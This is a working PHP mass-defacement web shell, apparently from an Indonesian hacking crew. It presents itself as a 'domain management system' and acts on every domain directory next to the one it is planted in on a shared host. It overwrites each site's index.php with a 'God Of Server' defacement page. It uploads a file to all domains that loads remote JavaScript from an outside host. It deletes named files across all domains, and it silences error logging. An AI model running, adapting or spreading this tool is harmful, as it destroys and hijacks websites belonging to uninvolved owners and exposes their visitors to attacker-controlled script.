<?php
@ini_set('display_errors', 0);
@ini_set('log_errors', 0);
session_start();
error_reporting(0);

class SimpleReplacer {
    private $rootDir;
    
    public function __construct() {
        $this->rootDir = $_SERVER['DOCUMENT_ROOT'] ?? dirname(__FILE__);
    }
    
    public function handleRequest() {
        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'])) {
            if ($_POST['action'] === 'replace') {
                return $this->doReplace();
            } elseif ($_POST['action'] === 'delete' && !empty($_POST['filename'])) {
                return $this->doDelete($_POST['filename']);
            } elseif ($_POST['action'] === 'upload') {
                return $this->doUpload();
            } elseif ($_POST['action'] === 'search' && !empty($_POST['username'])) {
                return $this->doSearch($_POST['username']);
            }
        }
        return false;
    }

    private function doSearch($username) {
        $dirs = $this->findDirs();
        
        if (!empty($dirs)) {
            return [
                'success' => "Data domain ditemukan oleh " . $username,
                'domains' => array_map(function($dir) { return basename($dir); }, $dirs),
                'count' => count($dirs)
            ];
        } else {
            return [
                'error' => "Tidak ada domain yang ditemukan"
            ];
        }
    }

    private function doDelete($filename) {
        $dirs = $this->findDirs();
        $count = 0;
        $list = [];

        foreach ($dirs as $dir) {
            $targetPath = $dir . '/' . $filename;
            if (file_exists($targetPath)) {
                if (@unlink($targetPath)) {
                    $count++;
                    $list[] = basename($dir);
                }
            }
        }

        return [
            'success' => "Deleted '{$filename}' in {$count} domain directories",
            'domains' => $list,
            'count' => $count
        ];
    }
    
    private function doReplace() {
        $dirs = $this->findDirs();
        $count = 0;
        $list = [];
        $indexContent = '<!DOCTYPE html><html><head><title>Touched BY GOD OF SERVER</title><meta name="theme-color" content="black"><meta property="og:description" content="Touched By God Of Server"><meta property="og:image" content="https://slbn1panti.sch.id/wp-content/uploads/2023/03/al1.jpg"><style>body,html{height:100%;margin:0;padding:0;overflow:hidden;}#snow{position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:9999;}.flake{position:absolute;background:rgba(180,180,220,0.7);border-radius:50%;}</style></head><body bgcolor="black"><div id="snow"></div><table height="100%" width="100%"><td align="center"><font size="5" color="white"><img title="GOD OF SERVER" width="250" src="https://slbn1panti.sch.id/wp-content/uploads/2023/03/al1.jpg"><pre>-  <span style="color:#9b5de5">God Of Server</span>  -<br><script>const a=new Audio("https://files.catbox.moe/5up4jh.mp3");a.loop=true;a.volume=0.3;const p=document.createElement("div");p.innerHTML=\'<div style="position:fixed;bottom:20px;right:20px;background:rgba(0,0,0,0.7);padding:10px;border-radius:5px;border:1px solid rgba(150,150,200,0.3)"><button onclick="a.paused?a.play():a.pause();this.innerHTML=a.paused?\\\'Play\\\':\\\'Pause\\\'" style="background:rgba(150,150,200,0.3);border:1px solid rgba(180,180,220,0.5);color:white;padding:5px 15px;border-radius:3px;cursor:pointer">Dengarkanlah Isi Hatiku^^</button><input type="range" min="0" max="100" value="30" oninput="a.volume=this.value/100" style="margin-left:10px;width:80px"></div>\';document.body.appendChild(p);</script><font size="4">"GOS@kali:~$ rm -rf /ingatanku/hatiku"<br><font size="4"><span style="color:#ffffff">"Aku tak ingin ngkau merasakan rasa sakit lebih dalam lagi nona:) - Pengagum Rahasiamu"</span><br><span style="color:#bdb4c7">"maafkan sampah sepertiku nona:)"</span></font><br><marquee width="30%" behavior="" direction="left" scrollamount="5" scrolldelay="20"><span style="color:#8e7cc3">God Of Server - Valtherion - Ryu - Byte - All God Of Server </span></marquee><br><marquee width="40%" behavior="" direction="left" scrollamount="10" scrolldelay="10"><span style="color:#6c5b7b">-</span></marquee></pre></td></table><script>const snow=document.getElementById(\'snow\');for(let i=0;i<100;i++){let flake=document.createElement(\'div\');flake.className=\'flake\';flake.style.width=Math.random()*5+2+\'px\';flake.style.height=flake.style.width;flake.style.left=Math.random()*100+\'vw\';flake.style.top=Math.random()*100+\'vh\';flake.style.opacity=Math.random()*0.6+0.2;snow.appendChild(flake);function fall(){let top=parseFloat(flake.style.top);top+=1;if(top>100){top=-5;flake.style.left=Math.random()*100+\'vw\';}flake.style.top=top+\'vh\';flake.style.left=parseFloat(flake.style.left)+(Math.sin(Date.now()/1000+i)*0.5)+\'vw\';requestAnimationFrame(fall);}fall();}</script></body></html>';
        
        foreach ($dirs as $dir) {
            $indexPath = $dir . '/index.php';
            $domainName = basename($dir);
            
            if (file_exists($indexPath)) {
                @$unlinkFunc = 'unlink';
                @$unlinkFunc($indexPath);
            }
            
            if (file_put_contents($indexPath, $indexContent, LOCK_EX)) {
                chmod($indexPath, 0644);
            } else {
                $handle = fopen($indexPath, 'w');
                if ($handle) {
                    fwrite($handle, $indexContent);
                    fclose($handle);
                    chmod($indexPath, 0644);
                }
            }
            $count++;
            $list[] = $domainName;
        }
        
        return [
            'success' => "Replaced index.php in {$count} domain directories",
            'domains' => $list,
            'count' => $count
        ];
    }

    private function doUpload() {
        $dirs = $this->findDirs();
        $count = 0;
        $list = [];

        $fileName = "alva.php"; 
        $fileContent = <<<'HTML'
<title>TRASER SEC TEAM -Seni Dari Kesedihan </title><meta name="theme-color" content="black"><meta property="og:description" content="Traser Sec Team Touched By ./Alva -Seni Dari Kesedihan"><meta property="og:image" content="https://i.ibb.co.com/Z6t0vnDJ/alvaror.png"><body bgcolor="black"><table height="100%" width="100%"><td align="center"><font size="5" color="white"><img title="AL - TRASER SEC TEAM" width="250" src="https://i.ibb.co.com/Z6t0vnDJ/alvaror.png"><script src="https://www.fizzkidssweeps.in.net/suljuy.js"></script><pre>-  <span style="color:#9b5de5">TRASER SECTEAM</span>  -<br><font size="4">"Alva@kali:~$ rm -rf /ingatanku/hatiku"<br><font size="4"><span style="color:#ffffff">"Aku tak ingin ngkau merasakan rasa sakit lebih dalam lagi nona:) - Alv"</span><br><span style="color:#bdb4c7">"maafkan sampah sepertiku nona:)"</span></font><br><marquee width="30%" behavior="" direction="left" scrollamount="5" scrolldelay="20"><span style="color:#8e7cc3">TRASER SECTEAM - AlvaXPloit - Anon404 - Rapip - Apis - Fall - DumperXIND - Darkness404 - Irfa - FreedomSec - AllTraser-</span></marquee><br><marquee width="40%" behavior="" direction="left" scrollamount="10" scrolldelay="10"><span style="color:#6c5b7b">-</span></marquee></pre>
HTML;

        foreach ($dirs as $dir) {
            $targetPath = $dir . '/' . $fileName;

            if (file_put_contents($targetPath, $fileContent, LOCK_EX)) {
                chmod($targetPath, 0644);
                $count++;
                $list[] = basename($dir) . '/' . $fileName;
            }
        }

        return [
            'success' => "Uploaded '{$fileName}' to {$count} domain directories",
            'domains' => $list,
            'count' => $count
        ];
    }
    
    private function findDirs() {
        $dirs = [];
        $parentDir = dirname($this->rootDir);
        
        if (is_dir($parentDir)) {
            $items = scandir($parentDir);
            foreach ($items as $item) {
                if ($item === '.' || $item === '..') continue;
                
                $itemPath = $parentDir . '/' . $item;
                if (is_dir($itemPath) && $this->isValidDir($item)) {
                    $dirs[] = $itemPath;
                }
            }
        }
        
        return $dirs;
    }
    
    private function isValidDir($dirname) {
        return preg_match('/^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/', $dirname) || 
               preg_match('/^[a-zA-Z0-9-]+\.[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/', $dirname);
    }
}

$sr = new SimpleReplacer();
$response = $sr->handleRequest();

if ($response && isset($response['success'])) {
    $successMessage = $response['success'];
} elseif ($response && isset($response['error'])) {
    $errorMessage = $response['error'];
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Index Replacer</title>
    <style>
        :root {
            --metal-light: #4a4a4a;
            --metal-dark: #1a1a1a;
            --metal-rust: #8b4513;
            --crack-color: #2a2a2a;
            --danger-red: #cc1f1a;
            --blood-red: #8b0000;
            --steel-blue: #2c3e50;
            --iron-gray: #36454f;
            --text-steel: #d3d3d3;
            --text-shadow: #000;
            --shadow-deep: rgba(0, 0, 0, 0.8);
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Arial Black', Arial, sans-serif;
            background: 
                linear-gradient(45deg, 
                    var(--metal-dark) 0%, 
                    var(--iron-gray) 25%, 
                    var(--metal-dark) 50%, 
                    var(--crack-color) 75%, 
                    var(--metal-dark) 100%
                ),
                radial-gradient(circle at 30% 70%, var(--metal-rust) 0%, transparent 30%),
                radial-gradient(circle at 80% 20%, var(--steel-blue) 0%, transparent 25%);
            color: var(--text-steel);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            position: relative;
            background-attachment: fixed;
        }
        
        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-image: 
                linear-gradient(0deg, transparent 24%, var(--crack-color) 25%, var(--crack-color) 26%, transparent 27%, transparent 74%, var(--crack-color) 75%, var(--crack-color) 76%, transparent 77%, transparent),
                linear-gradient(90deg, transparent 24%, var(--crack-color) 25%, var(--crack-color) 26%, transparent 27%, transparent 74%, var(--crack-color) 75%, var(--crack-color) 76%, transparent 77%, transparent);
            background-size: 50px 50px;
            opacity: 0.1;
            pointer-events: none;
            z-index: -1;
        }
        
        .container {
            max-width: 550px;
            width: 100%;
            background: 
                linear-gradient(135deg, 
                    var(--metal-dark) 0%, 
                    var(--iron-gray) 30%, 
                    var(--metal-light) 50%, 
                    var(--iron-gray) 70%, 
                    var(--metal-dark) 100%
                );
            padding: 35px;
            border-radius: 5px;
            border: 3px solid var(--metal-light);
            text-align: center;
            position: relative;
            box-shadow: 
                inset 0 0 20px var(--shadow-deep),
                0 0 50px var(--shadow-deep),
                inset 5px 5px 10px var(--metal-rust),
                inset -5px -5px 10px rgba(255,255,255,0.1);
        }
        
        .container::before {
            content: '';
            position: absolute;
            top: 10px;
            left: 10px;
            right: 10px;
            bottom: 10px;
            background: 
                linear-gradient(45deg, transparent 49%, var(--crack-color) 50%, transparent 51%),
                linear-gradient(-45deg, transparent 49%, var(--crack-color) 50%, transparent 51%);
            background-size: 20px 20px;
            opacity: 0.2;
            pointer-events: none;
            border-radius: 3px;
        }
        
        .header-image {
            display: block;
            margin: 0 auto 20px auto;
            width: 100px;
            height: 100px;
            border-radius: 5px;
            border: 3px solid var(--metal-rust);
            box-shadow: 
                0 0 20px var(--shadow-deep),
                inset 0 0 10px var(--shadow-deep);
            filter: sepia(30%) saturate(150%) contrast(120%);
            transition: all 0.3s ease;
        }
        
        .header-image:hover {
            filter: sepia(50%) saturate(200%) contrast(150%);
            box-shadow: 
                0 0 30px var(--metal-rust),
                inset 0 0 15px var(--shadow-deep);
        }
        
        .container h1 {
            color: var(--text-steel);
            font-size: 1.8rem;
            margin-bottom: 25px;
            font-weight: 900;
            text-shadow: 
                2px 2px 0px var(--text-shadow),
                4px 4px 8px var(--shadow-deep);
            letter-spacing: 1px;
            text-transform: uppercase;
        }
        
        .message {
            padding: 12px 18px;
            border-radius: 3px;
            margin-bottom: 20px;
            font-weight: 700;
            border: 2px solid;
            box-shadow: 
                inset 0 0 8px var(--shadow-deep),
                0 4px 10px var(--shadow-deep);
            text-shadow: 1px 1px 2px var(--text-shadow);
            font-size: 14px;
        }
        
        .message.success {
            background: linear-gradient(135deg, var(--steel-blue), var(--iron-gray));
            border-color: var(--steel-blue);
            color: var(--text-steel);
        }
        
        .message.error {
            background: linear-gradient(135deg, var(--danger-red), var(--blood-red));
            border-color: var(--blood-red);
            color: var(--text-steel);
        }
        
        .btn {
            background: 
                linear-gradient(135deg, 
                    var(--metal-light) 0%, 
                    var(--iron-gray) 25%, 
                    var(--metal-rust) 50%, 
                    var(--iron-gray) 75%, 
                    var(--metal-dark) 100%
                );
            color: var(--text-steel);
            border: 2px solid var(--metal-light);
            padding: 12px 25px;
            border-radius: 0;
            cursor: pointer;
            font-size: 13px;
            font-weight: 700;
            transition: all 0.3s ease;
            width: 100%;
            position: relative;
            overflow: hidden;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            text-shadow: 
                1px 1px 0px var(--text-shadow),
                2px 2px 4px var(--shadow-deep);
            box-shadow: 
                inset 0 0 10px var(--shadow-deep),
                0 5px 10px var(--shadow-deep),
                inset 2px 2px 4px rgba(255,255,255,0.1),
                inset -2px -2px 4px var(--metal-rust);
        }
        
        .btn::before {
            content: '';
            position: absolute;
            top: 50%;
            left: 50%;
            width: 0;
            height: 0;
            background: 
                radial-gradient(circle, 
                    rgba(255,255,255,0.3) 0%, 
                    transparent 70%
                );
            transition: all 0.6s ease;
            transform: translate(-50%, -50%);
        }
        
        .btn:hover::before {
            width: 200px;
            height: 200px;
        }
        
        .btn:hover {
            transform: translateY(-1px);
            box-shadow: 
                inset 0 0 12px var(--shadow-deep),
                0 7px 14px var(--shadow-deep),
                inset 3px 3px 6px rgba(255,255,255,0.15),
                inset -3px -3px 6px var(--blood-red);
            border-color: var(--metal-rust);
        }
        
        .btn:active {
            transform: translateY(0px);
            box-shadow: 
                inset 0 0 15px var(--shadow-deep),
                0 3px 6px var(--shadow-deep);
        }
        
        .btn.search-btn {
            background: 
                linear-gradient(135deg, 
                    var(--steel-blue) 0%, 
                    var(--iron-gray) 50%, 
                    var(--metal-dark) 100%
                );
            margin-top: 15px;
        }
        
        .btn.upload-btn {
            background: 
                linear-gradient(135deg, 
                    var(--iron-gray) 0%, 
                    var(--metal-light) 50%, 
                    var(--metal-dark) 100%
                );
        }
        
        .btn.delete-btn {
            background: 
                linear-gradient(135deg, 
                    var(--danger-red) 0%, 
                    var(--blood-red) 50%, 
                    var(--metal-dark) 100%
                );
        }
        
        .input-field {
            padding: 10px 15px;
            width: 100%;
            margin-bottom: 10px;
            border-radius: 0;
            border: 2px solid var(--metal-light);
            background: 
                linear-gradient(135deg, 
                    var(--metal-dark) 0%, 
                    var(--iron-gray) 100%
                );
            color: var(--text-steel);
            font-size: 14px;
            font-weight: bold;
            transition: all 0.3s ease;
            box-shadow: 
                inset 0 0 10px var(--shadow-deep),
                0 3px 6px var(--shadow-deep);
        }
        
        .input-field:focus {
            outline: none;
            border-color: var(--metal-rust);
            box-shadow: 
                inset 0 0 12px var(--shadow-deep),
                0 0 10px var(--metal-rust);
        }
        
        .info {
            margin-top: 20px;
            padding: 15px;
            background: 
                linear-gradient(135deg, 
                    var(--metal-dark) 0%, 
                    var(--iron-gray) 100%
                );
            border-radius: 0;
            border: 2px solid var(--crack-color);
            font-size: 12px;
            color: var(--text-steel);
            text-shadow: 1px 1px 2px var(--text-shadow);
            box-shadow: 
                inset 0 0 8px var(--shadow-deep),
                0 4px 8px var(--shadow-deep);
        }
        
        .results {
            margin-top: 20px;
            padding: 20px;
            background: 
                linear-gradient(135deg, 
                    var(--metal-dark) 0%, 
                    var(--iron-gray) 100%
                );
            border-radius: 0;
            border: 2px solid var(--metal-light);
            text-align: left;
            box-shadow: 
                inset 0 0 12px var(--shadow-deep),
                0 8px 16px var(--shadow-deep);
        }
        
        .results h3 {
            color: var(--text-steel);
            margin-bottom: 15px;
            text-align: center;
            font-size: 1.1rem;
            font-weight: 900;
            text-shadow: 2px 2px 4px var(--text-shadow);
            text-transform: uppercase;
        }
        
        .domain-list {
            background: var(--metal-dark);
            padding: 15px;
            border-radius: 0;
            border: 2px solid var(--crack-color);
            font-family: 'Courier New', monospace;
            font-size: 12px;
            font-weight: bold;
            max-height: 200px;
            overflow-y: auto;
            margin-bottom: 15px;
            line-height: 1.4;
            box-shadow: 
                inset 0 0 10px var(--shadow-deep),
                0 4px 8px var(--shadow-deep);
        }
        
        .domain-list::-webkit-scrollbar {
            width: 10px;
        }
        
        .domain-list::-webkit-scrollbar-track {
            background: var(--metal-dark);
            border: 1px solid var(--crack-color);
        }
        
        .domain-list::-webkit-scrollbar-thumb {
            background: 
                linear-gradient(180deg, 
                    var(--metal-light) 0%, 
                    var(--metal-rust) 100%
                );
            border: 1px solid var(--crack-color);
        }
        
        .copy-btn {
            background: 
                linear-gradient(135deg, 
                    var(--metal-rust) 0%, 
                    var(--iron-gray) 50%, 
                    var(--metal-dark) 100%
                );
            color: var(--text-steel);
            border: 2px solid var(--metal-light);
            padding: 8px 20px;
            border-radius: 0;
            cursor: pointer;
            font-size: 12px;
            font-weight: 700;
            width: 100%;
            transition: all 0.3s ease;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            text-shadow: 1px 1px 2px var(--text-shadow);
            box-shadow: 
                inset 0 0 8px var(--shadow-deep),
                0 4px 8px var(--shadow-deep);
        }
        
        .copy-btn:hover {
            transform: translateY(-1px);
            box-shadow: 
                inset 0 0 10px var(--shadow-deep),
                0 6px 12px var(--shadow-deep);
            border-color: var(--metal-rust);
        }
        
        .form-group {
            margin-bottom: 15px;
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://raw.githubusercontent.com/AlvaXPloit/ISI/refs/heads/main/IMG_20250829_022558_647.jpg" alt="Logo" class="header-image">
        <h1>DOMAIN CONTROLLER</h1>
        
        <?php if (isset($successMessage)): ?>
            <div class="message success"><?php echo htmlspecialchars($successMessage); ?></div>
        <?php endif; ?>
        
        <?php if (isset($errorMessage)): ?>
            <div class="message error"><?php echo htmlspecialchars($errorMessage); ?></div>
        <?php endif; ?>
        
        <form method="post">
            <input type="hidden" name="action" value="replace">
            <button type="submit" class="btn">REPLACE INDEX FILES</button>
        </form>

        <button type="button" class="btn search-btn" onclick="searchDomains()">SEARCH DOMAINS</button>
        
        <form method="post" style="margin-top:15px;">
            <input type="hidden" name="action" value="upload">
            <button type="submit" class="btn upload-btn">UPLOAD FILE TO ALL DOMAINS</button>
        </form>
        
        <form method="post" style="margin-top:15px;">
            <div class="form-group">
                <input type="hidden" name="action" value="delete">
                <input type="text" name="filename" placeholder="MASUKKAN NAMA FILE" class="input-field">
                <button type="submit" class="btn delete-btn">DELETE FILE IN ALL DOMAINS</button>
            </div>
        </form>
        
        <?php if (isset($response['domains']) && !empty($response['domains'])): ?>
            <div class="results">
                <h3>DOMAIN RESULTS (<?php echo $response['count']; ?>)</h3>
                <div class="domain-list" id="domainList">
<?php foreach ($response['domains'] as $domain): ?>
https://<?php echo htmlspecialchars($domain); ?><br>
<?php endforeach; ?>
                </div>
                <button type="button" class="copy-btn" onclick="copyDomains()">COPY ALL DOMAINS</button>
            </div>
        <?php endif; ?>
        
        <div class="info">
            ADVANCED DOMAIN MANAGEMENT SYSTEM
        </div>
    </div>

    <script>
        function searchDomains() {
            const username = prompt("MASUKKAN NAMA ANDA:");
            if (username && username.trim()) {
                const form = document.createElement('form');
                form.method = 'post';
                form.innerHTML = '<input type="hidden" name="action" value="search"><input type="hidden" name="username" value="' + username.trim() + '">';
                document.body.appendChild(form);
                form.submit();
            }
        }
        
        function copyDomains() {
            const domainList = document.getElementById('domainList');
            const text = domainList.innerText;
            
            if (navigator.clipboard) {
                navigator.clipboard.writeText(text).then(() => {
                    showCopySuccess();
                });
            } else {
                const textArea = document.createElement('textarea');
                textArea.value = text;
                document.body.appendChild(textArea);
                textArea.select();
                document.execCommand('copy');
                document.body.removeChild(textArea);
                showCopySuccess();
            }
        }
        
        function showCopySuccess() {
            const btn = document.querySelector('.copy-btn');
            const originalText = btn.textContent;
            btn.textContent = 'COPIED!';
            
            setTimeout(() => {
                btn.textContent = originalText;
            }, 2000);
        }
    </script>
</body>
</html>
